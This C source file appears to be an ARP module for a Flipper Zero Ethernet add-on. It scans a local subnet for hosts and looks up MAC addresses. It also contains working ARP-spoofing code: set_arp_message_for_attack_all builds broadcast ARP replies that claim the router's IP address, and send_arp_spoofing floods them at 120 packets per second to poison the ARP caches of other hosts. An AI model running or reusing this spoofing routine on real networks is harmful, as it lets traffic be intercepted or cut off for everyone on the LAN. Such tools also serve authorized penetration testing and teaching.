#include "arp_module.h"
#include "../libraries/generals/ethernet_generals.h"
#include "../libraries/protocol_tools/ethernet_protocol.h"
#include "../libraries/protocol_tools/arp.h"

// Packets sent per second
uint8_t packet_rate = 120;

// My Mac
uint8_t my_mac[6] = {0};

// My Ip
uint8_t my_ip[4] = {0};

/**
 * Function to set the MAC address
 */
void arp_set_my_mac_address(uint8_t* MAC) {
    if(MAC == NULL) return;
    memcpy(my_mac, MAC, 6);
}

/**
 * Function to set our own ip
 */

void arp_set_my_ip_address(uint8_t* ip) {
    if(ip == NULL) return;
    memcpy(my_ip, ip, 4);
}

/**
 * Function to set our arp message for attack
 *
 */
void set_arp_message_for_attack_all(
    uint8_t* buffer,
    uint8_t* MAC,
    uint8_t* ip_for_router,
    uint16_t* len) {
    set_ethernet_header(buffer, MAC, MAC_BROADCAST, 0x806);

    // For the ArpSpoofing we need to send this continuosly
    arp_set_header_ipv4(
        buffer + ETHERNET_HEADER_LEN, MAC, MAC_BROADCAST, ip_for_router, IP_BROADCAST, 0x0002);

    // Set the length of the message
    *len = ETHERNET_HEADER_LEN + ARP_LEN;
}

/**
 * Function to attack the ethernet network with arp spoofing
 *
 * Buffer needs to set before with an arp function to set the message
 */
void send_arp_spoofing(enc28j60_t* ethernet, uint8_t* buffer, uint16_t len) {
    static uint32_t prev_time = 0;

    if((furi_get_tick()) > (prev_time + (1000 / packet_rate))) {
        send_packet(ethernet, buffer, len); // Send packet
        prev_time = furi_get_tick();
    }
}

/**
 * Function to send an ARP request to a specific IP address
 */
bool set_arp_request(uint8_t* buffer, uint16_t* len, uint8_t* target_ip) {
    if(!buffer || !target_ip) return false;

    // Set up Ethernet header (ARP type = 0x0806)
    if(!set_ethernet_header(buffer, my_mac, MAC_BROADCAST, 0x0806)) {
        return false;
    }

    // Set up ARP header
    // ARP operation code 1 = request
    if(!arp_set_header_ipv4(
           buffer + ETHERNET_HEADER_LEN, my_mac, MAC_BROADCAST, my_ip, target_ip, 1)) {
        return false;
    }

    *len = ETHERNET_HEADER_LEN + ARP_LEN;

    return true;
}

/**
 * Function to know if it is the same IP
 */
bool is_the_ip(uint8_t* current_ip, uint8_t* compare_ip) {
    uint32_t ip_get_it = current_ip[0] << 24 | current_ip[1] << 16 | current_ip[2] << 8 |
                         current_ip[3];
    uint32_t ip_propused = compare_ip[0] << 24 | compare_ip[1] << 16 | compare_ip[2] << 8 |
                           compare_ip[3];

    // And check if it is the same
    if(ip_get_it != ip_propused) return false;

    return true;
}

/**
 * Function to get the ARP replay
 */
bool get_arp_reply(uint8_t* current_ip, uint8_t* get_mac, uint8_t* buffer, uint16_t len) {
    if(!buffer || len < ETHERNET_HEADER_LEN + ARP_LEN) return false;

    // Get ARP header
    arp_header_t arp_header = arp_get_header(buffer);

    // Check if this is an ARP reply (operation code 2)
    uint16_t opcode = (arp_header.operation_code[0] << 8) | arp_header.operation_code[1];
    if(opcode != 2) return false;

    // And check if it is the same
    if(!is_the_ip(current_ip, arp_header.ip_source)) return false;

    // Copy the MAC Address
    memcpy(get_mac, arp_header.mac_source, 6);

    return true;
}

/**
 *  Function to ARP scan, get all the IP
 */
void arp_scan_network(
    enc28j60_t* ethernet,
    arp_list* list,
    uint8_t* own_mac,
    uint8_t* own_ip,
    uint8_t init_ip[4],
    uint8_t* list_count,
    uint8_t range) {
    printf("ARP SCAN STARTED ==========================================\n");

    arp_set_my_mac_address(own_mac);
    arp_set_my_ip_address(own_ip);

    uint8_t* tx_buffer = ethernet->tx_buffer;
    uint8_t* rx_buffer = ethernet->rx_buffer;

    uint16_t size = 1000;

    uint8_t start_list[4] = {0};

    memcpy(start_list, init_ip, 4);

    uint8_t mac_to_get[6] = {0};
    uint8_t counter = 0;

    for(uint8_t i = 0; i < range; i++) {
        if(start_list[3] == 255) {
            start_list[2]++;
            start_list[3] = 0;
        }

        if(is_the_ip(start_list, my_ip)) continue;

        memset(mac_to_get, 0, 6);

        set_arp_request(tx_buffer, &size, start_list);

        send_packet(ethernet, tx_buffer, size);

        uint32_t current_time = furi_get_tick();

        while(true) {
            size = receive_packet(ethernet, rx_buffer, MAX_FRAMELEN);

            if(is_arp(rx_buffer)) {
                if(get_arp_reply(own_ip, mac_to_get, rx_buffer, size)) {
                    printf(
                        "==================\nIP: %u.%u.%u.%u MAC: %02x:%02x:%02x:%02x:%02x:%02x\n===================\n",
                        start_list[0],
                        start_list[1],
                        start_list[2],
                        start_list[3],
                        mac_to_get[0],
                        mac_to_get[1],
                        mac_to_get[2],
                        mac_to_get[3],
                        mac_to_get[4],
                        mac_to_get[5]);
                    memcpy(list[counter].ip, start_list, 4);
                    memcpy(list[counter].mac, mac_to_get, 6);
                    counter++;
                    break;
                }
            }

            if(furi_get_tick() > (current_time + 100)) {
                break;
            }
        }
        start_list[3]++;
    }

    *list_count = counter;
}

/**
 * Function to get the MAC address of specific IP address
 */
bool arp_get_specific_mac(enc28j60_t* ethernet, uint8_t* src_ip, uint8_t* dst_ip, uint8_t* mac_dst) {
    uint16_t packet_len = 0;
    uint8_t packet[500] = {0};

    // Flag to return
    bool ret = false;

    // Set my MAC
    memcpy(my_mac, ethernet->mac_address, 6);

    // Set my IP
    memcpy(my_ip, src_ip, 4);

    // Set the ARP request
    set_arp_request(packet, &packet_len, dst_ip);

    // Send arp packet
    send_packet(ethernet, packet, packet_len);

    // enable_promiscuous(ethernet);

    uint32_t last_time = furi_get_tick();

    while(((furi_get_tick() - last_time) < 2000) && !ret) {
        packet_len = receive_packet(ethernet, packet, 1500);
        if(packet_len) {
            if(is_arp(packet)) {
                ret = get_arp_reply(dst_ip, mac_dst, packet, packet_len);
            }
        }

        furi_delay_ms(1);
    }
    // disable_promiscuous(ethernet);

    return ret;
}
